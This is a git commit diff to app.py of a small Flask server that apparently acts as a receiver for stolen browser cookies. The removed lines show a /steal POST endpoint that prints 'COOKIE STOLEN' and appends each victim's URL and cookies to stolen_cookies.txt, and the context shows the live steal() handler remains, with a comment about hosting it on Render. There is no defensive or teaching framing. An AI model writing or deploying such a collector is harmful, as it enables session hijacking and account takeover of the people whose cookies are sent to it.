44677f402f06b0e397a6c9b796fe90274d4585c2
Ratnesh-Coder <rattneshkumar2024@gmail.com>
2025-11-19 23:15:59 +0530

    Updated app.py

--- app.py
+++ app.py
@@ -1,32 +1,3 @@
-# from flask import Flask, request 
-# from flask_cors import CORS
-
-# app = Flask(__name__) 
-# CORS(app)
-
-# @app.route('/', methods=['GET'])
-# def home():
-#     return "Server is running over HTTPS!"
-
-# @app.route('/steal', methods=['POST'])
-# def steal():
-#     data= request.json
-#     print("\n--- COOKIE STOLEN ---") 
-#     print(f"URL: {data['url']}") 
-#     print(f"Cookies: {data['cookies']}") 
-    
-#     with open("stolen_cookies.txt", "a") as f:
-#         f.write (f"URL: {data['url']}\nCookies: {data['cookies']}\n\n")
-#     return "OK"
-
-# if __name__ == '__main__': 
-#     # app.run(host='0.0.0.0', port=5000, ssl_context=('cert.pem', 'key.pem')) 
-#     app.run()
-
-
-
-
-
 from flask import Flask, request
 from flask_cors import CORS
 
@@ -48,5 +19,3 @@ def steal():
     print("==========================\n")
     
     return "OK", 200
-
-# ❌ REMOVE app.run() completely (Render doesn't need it)
